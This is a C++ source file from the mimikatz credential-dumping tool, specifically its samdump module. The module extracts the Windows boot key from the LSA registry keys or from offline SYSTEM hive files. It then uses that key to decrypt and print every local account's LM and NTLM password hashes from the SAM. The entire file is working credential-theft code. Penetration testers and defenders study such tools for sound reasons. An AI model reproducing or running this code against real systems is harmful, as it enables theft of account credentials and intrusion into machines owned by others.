/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "mod_mimikatz_samdump.h"
#include "..\global.h"

vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_samdump::getMimiKatzCommands()
{
	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(full, L"hashes", L"Récupère la bootkey depuis une ruche SYSTEM puis les hashes depuis une ruche SAM"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(bootkey, L"bootkey", L"Récupère la bootkey depuis une ruche SYSTEM"));
	return monVector;
}

bool mod_mimikatz_samdump::bootkey(vector<wstring> * arguments)
{
	unsigned char bootkey[0x10];
	if(!arguments->empty())
		getInfosFromHive(arguments->front(), bootkey);
	else
		getInfosFromReg(bootkey);
	return true;
}

bool mod_mimikatz_samdump::full(vector<wstring> * arguments)
{
	unsigned char bootkey[0x10];
	if(!arguments->empty() && (arguments->size() >= 1 && arguments->size() <= 2))
	{
		if(getInfosFromHive(arguments->front().c_str(), bootkey))
		{
			if(!getUsersAndHashesFromHive(arguments->back().c_str(), bootkey))
				(*outputStream) << L"Erreur lors de l\'exploration des ruches" << endl;
		}
	}
	else
	{
		if(getInfosFromReg(bootkey))
		{
			if(!getUsersAndHashesFromReg(bootkey))
				(*outputStream) << L"Erreur lors de l\'exploration du registre" << endl;
		}
	}
	return true;
}

bool mod_mimikatz_samdump::getUsersAndHashesFromHive(wstring samHive, unsigned char bootkey[0x10])
{
	bool reussite = false;

	mod_hive::hive * monHive = new mod_hive::hive();
	mod_hive::InitHive(monHive); 
	if(mod_hive::RegOpenHive(samHive.c_str(), monHive))
	{
		string * rootKey = new string();
		if(mod_hive::RegGetRootKey(monHive, rootKey))
		{
			string * keyAccountName = new string(*rootKey); keyAccountName->append("\\SAM\\Domains\\Account");
			string * valAccountName = new string("F");
			int longueurF = 0; unsigned char *bufferF = NULL;

			if(mod_hive::RegOpenKeyQueryValue(monHive, keyAccountName, valAccountName, &bufferF, &longueurF))
			{
				BYTE hBootKey[0x20] = {0};
				if(mod_hash::getHbootKeyFromBootKeyAndF(hBootKey, bootkey, bufferF))
				{
					string * keyUsers = new string(*rootKey); keyUsers->append("\\SAM\\Domains\\Account\\Users");
					mod_hive::nk_hdr * nodeUsers = new mod_hive::nk_hdr();
					if(mod_hive::RegOpenKey(monHive, keyUsers, &nodeUsers ))
					{
						vector<string> * keyNames = new vector<string>();
						if(reussite = mod_hive::RegEnumKey(monHive, nodeUsers, keyNames))
						{
							for(vector<string>::iterator maKey = keyNames->begin(); maKey != keyNames->end(); maKey++)
							{
								if(maKey->compare("Names") != 0)
								{
									string * keyUser = new string(*keyUsers); keyUser->append("\\"); keyUser->append(*maKey);
									string valUserF = "F"; mod_hash::USER_F * userF = NULL; int longueurF = 0;
									string valUserV = "V"; mod_hash::USER_V * userV = NULL; int longueurV = 0;
									
									if(reussite &= mod_hive::RegOpenKeyQueryValue(monHive, keyUser, &valUserV, reinterpret_cast<unsigned char **>(&userV), &longueurV) &&
										mod_hive::RegOpenKeyQueryValue(monHive, keyUser, &valUserF, reinterpret_cast<unsigned char **>(&userF), &longueurF))
									{
										infosFromUserAndKey(userF, userV, hBootKey);
										delete[] userF, userV;
									}
									delete keyUser;
								}
							}
						}
						delete keyNames;
					}
					delete nodeUsers, keyUsers;
				}
				delete[] bufferF;
			}
			delete valAccountName, keyAccountName;
		}
		delete rootKey;
	}
	delete monHive;

	return reussite;
}

bool mod_mimikatz_samdump::getInfosFromHive(wstring systemHive, unsigned char bootkey[0x10])
{
	bool reussite = false;

	mod_hive::hive * monHive = new mod_hive::hive();
	mod_hive::InitHive(monHive);

	if(mod_hive::RegOpenHive(systemHive.c_str(), monHive))
	{
		string * rootKey = new string();
		if(mod_hive::RegGetRootKey(monHive, rootKey))
		{
			DWORD nControlSet = 0;
			if(getNControlSetFromHive(monHive, rootKey, &nControlSet))
			{
				stringstream  * monControlSet = new stringstream;
				*monControlSet << *rootKey << "\\ControlSet" <<  setw(3) << setfill('0') << nControlSet;
				string * fullControlSet = new string(monControlSet->str());
				delete monControlSet;

				wstring * computerName = new wstring();
				if(getComputerNameFromHive(monHive, fullControlSet, computerName))
					(*outputStream) << L"Ordinateur : " << *computerName << endl;
				delete computerName;

				if(reussite = getBootKeyFromHive(monHive, fullControlSet, bootkey))
					(*outputStream) << L"BootKey    : " << mod_text::stringOfHex(bootkey, 0x10) << endl;
				delete fullControlSet;
			}
		}
		delete rootKey;
		mod_hive::RegCloseHive(monHive);
	}
	delete monHive;

	return reussite;
}

bool mod_mimikatz_samdump::getComputerNameFromHive(mod_hive::hive * theHive, string * fullControlSet, wstring * computerName)
{
	bool reussite = false;

	string * keyComputerName = new string(*fullControlSet); keyComputerName->append("\\Control\\ComputerName\\ComputerName");
	string * valComputerName = new string("ComputerName");
	int longueur = 0; unsigned char *buffer = NULL;
	if(reussite = mod_hive::RegOpenKeyQueryValue(theHive, keyComputerName, valComputerName, &buffer, &longueur))
	{
		computerName->assign(reinterpret_cast<wchar_t *>(buffer), longueur / sizeof(wchar_t));
		delete[] buffer;
	}
	delete valComputerName;
	delete keyComputerName;

	return reussite;
}

bool mod_mimikatz_samdump::getBootKeyFromHive(mod_hive::hive * theHive, string * fullControlSet, unsigned char bootkey[0x10])
{
	bool reussite = false;

	unsigned char key[0x10];
	char *kn[] = {"JD", "Skew1", "GBG", "Data"};

	for(unsigned int i = 0; i < sizeof(kn) / sizeof(char *); i++ )
	{
		string * maKey = new string(*fullControlSet); maKey->append("\\Control\\Lsa\\"); maKey->append(kn[i]);
		mod_hive::nk_hdr * n = new mod_hive::nk_hdr();

		if(reussite = mod_hive::RegOpenKey(theHive, maKey, &n))
		{
			char kv[9] = {0};
			unsigned char *b = mod_hive::read_data(theHive, n->classname_off + 0x1000);
			for(short j = 0; j < (n->classname_len / 2) && j < 8; j++)
				kv[j] = b[j*2];
			sscanf_s(kv, "%x", (unsigned int*) (&key[i*4]));
		}
		delete n, maKey;
	}

	if(reussite)
		mod_hash::getBootKeyFromKey(bootkey, key);

	return reussite;
}

bool mod_mimikatz_samdump::getBootKeyFromReg(BYTE bootkey[0x10])
{
	bool reussite = false;

	DWORD code;
	BYTE key[0x10] = {0};
	wchar_t * kn[] = {L"JD", L"Skew1", L"GBG", L"Data"};
	HKEY monLSA;
	code = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Lsa", 0, KEY_READ, &monLSA);
	if(code == ERROR_SUCCESS)
	{
		for(unsigned int i = 0; (i < sizeof(kn) / sizeof(wchar_t *)) && (code == ERROR_SUCCESS); i++ )
		{
			HKEY monSecret;
			code = RegOpenKeyEx(monLSA, kn[i], 0, KEY_READ, &monSecret);
			if(code == ERROR_SUCCESS)
			{
				wchar_t monBuffer[8 + 1];
				DWORD maTaille = 8 + 1;

				code = RegQueryInfoKey(monSecret, monBuffer, &maTaille, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
				if(code == ERROR_SUCCESS)
					swscanf_s(monBuffer, L"%x", (DWORD *) (&key[i * sizeof(DWORD)]));
				else (*outputStream) << L"RegQueryInfoKey " << kn[i] << " : " << mod_system::getWinError(false, code) << endl;
				RegCloseKey(monSecret);
			} else (*outputStream) << L"RegOpenKeyEx " << kn[i] << " : " << mod_system::getWinError(false, code) << endl;
		}
		RegCloseKey(monLSA);
	} else (*outputStream) << L"RegOpenKeyEx LSA : " << mod_system::getWinError(false, code) << endl;

	if(reussite = (code == ERROR_SUCCESS))
		mod_hash::getBootKeyFromKey(bootkey, key);

	return reussite;
}



bool mod_mimikatz_samdump::getNControlSetFromHive(mod_hive::hive * theHive, string * rootKey, DWORD * nControlSet)
{
	bool reussite = false;

	string * selectKey = new string(*rootKey); selectKey->append("\\Select");
	string * nDefault = new string("Default");
	int longueur = 0; unsigned char *buffer = NULL;

	if(mod_hive::RegOpenKeyQueryValue(theHive, selectKey, nDefault, &buffer, &longueur))
	{
		if(reussite = (longueur == sizeof(DWORD)))
			*nControlSet = *(DWORD *) (buffer);
		delete[] buffer;
	}

	delete nDefault, selectKey;
	return reussite;
}

bool mod_mimikatz_samdump::getInfosFromReg(BYTE bootkey[0x10])
{
	bool reussite = false;

	wstring * computerName = new wstring();
	if(mod_system::getComputerName(computerName))
		(*outputStream) << L"Ordinateur : " << *computerName << endl;
	delete computerName;

	if(reussite = getBootKeyFromReg(bootkey))
		(*outputStream) << L"BootKey    : " << mod_text::stringOfHex(bootkey, 0x10) << endl;

	return reussite;
}


bool mod_mimikatz_samdump::getUsersAndHashesFromReg(BYTE bootkey[0x10])
{
	bool reussite = false;
	
	DWORD code;
	HKEY maSAM;
	code = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SAM\\SAM\\Domains\\Account", 0, KEY_READ, &maSAM);
	if(code == ERROR_SUCCESS)
	{
		DWORD tailleRequise = 0;
		code = RegQueryValueEx(maSAM, L"F", NULL, NULL, NULL, &tailleRequise);
		if(code == ERROR_SUCCESS)
		{
			BYTE * bufferF = new BYTE[tailleRequise];
			code = RegQueryValueEx(maSAM, L"F", NULL, NULL, bufferF, &tailleRequise);
			if(code == ERROR_SUCCESS)
			{
				BYTE hBootKey[0x10] = {0};
				if(mod_hash::getHbootKeyFromBootKeyAndF(hBootKey, bootkey, bufferF))
				{
					HKEY mesUsers;
					code = RegOpenKeyEx(maSAM, L"Users", 0, KEY_READ, &mesUsers);
					if(code == ERROR_SUCCESS)
					{
						DWORD nombreUsers = 0, tailleMaxSousCle = 0;
						code = RegQueryInfoKey(mesUsers, NULL, NULL, NULL, &nombreUsers, &tailleMaxSousCle, NULL, NULL, NULL, NULL, NULL, NULL);
						if(reussite = (code == ERROR_SUCCESS))
						{
							tailleMaxSousCle++;
							wchar_t * monRid = new wchar_t[tailleMaxSousCle];
							for(DWORD i = 0; i < nombreUsers ; i++)
							{
								DWORD tailleRid = tailleMaxSousCle;
								code = RegEnumKeyExW(mesUsers, i, monRid, &tailleRid, NULL, NULL, NULL, NULL);
								if(code == ERROR_SUCCESS)
								{
									if(_wcsicmp(monRid, L"Names") != 0)
									{
										HKEY monUser;
										code = RegOpenKeyEx(mesUsers, monRid, 0, KEY_READ, &monUser);
										if(reussite &= (code == ERROR_SUCCESS))
										{
											DWORD tailleF = 0, tailleV = 0;
											if((RegQueryValueEx(monUser, L"F", NULL, NULL, NULL, &tailleF) == ERROR_SUCCESS) &&
												(RegQueryValueEx(monUser, L"V", NULL, NULL, NULL, &tailleV) == ERROR_SUCCESS))
											{
												mod_hash::USER_F * userF = reinterpret_cast<mod_hash::USER_F *>(new BYTE[tailleF]);
												mod_hash::USER_V * userV = reinterpret_cast<mod_hash::USER_V *>(new BYTE[tailleV]);

												if((RegQueryValueEx(monUser, L"F", NULL, NULL, reinterpret_cast<BYTE *>(userF), &tailleF) == ERROR_SUCCESS) &&
													(RegQueryValueEx(monUser, L"V", NULL, NULL, reinterpret_cast<BYTE *>(userV), &tailleV) == ERROR_SUCCESS))
													infosFromUserAndKey(userF, userV, hBootKey);

												delete[] userF, userV;
											}
											RegCloseKey(monUser);
										}
									}
								} else (*outputStream) << L"RegEnumKeyExW : " << mod_system::getWinError(false, code) << endl;
							}
							delete[] monRid;
						}
						RegCloseKey(mesUsers);
					} else (*outputStream) << L"RegOpenKeyEx Users : " << mod_system::getWinError(false, code) << endl;
				}
			} else (*outputStream) << L"RegQueryValueEx 2 F : " << mod_system::getWinError(false, code) << endl;
			delete[] bufferF;
		} else (*outputStream) << L"RegQueryValueEx 1 F : " << mod_system::getWinError(false, code) << endl;
		RegCloseKey(maSAM);
	} else (*outputStream) << L"RegOpenKeyEx SAM : " << mod_system::getWinError(false, code) << endl;

	return reussite;
}

void mod_mimikatz_samdump::infosFromUserAndKey(mod_hash::USER_F * userF, mod_hash::USER_V * userV, BYTE hBootKey[0x10])
{
	wstring hashLM, hashNTLM;
	mod_hash::decryptHash(&hashLM, hBootKey, userV, &userV->LM, userF->UserId, false);
	mod_hash::decryptHash(&hashNTLM, hBootKey, userV, &userV->NTLM, userF->UserId, true);
	
	(*outputStream) << endl <<
		L"Rid  : " <<  userF->UserId << endl <<
		L"User : " << wstring((wchar_t *) (&(userV->datas) + userV->Username.offset), userV->Username.lenght / sizeof(wchar_t)) << endl <<
		L"LM   : " << hashLM << endl <<
		L"NTLM : " << hashNTLM << endl
		;
}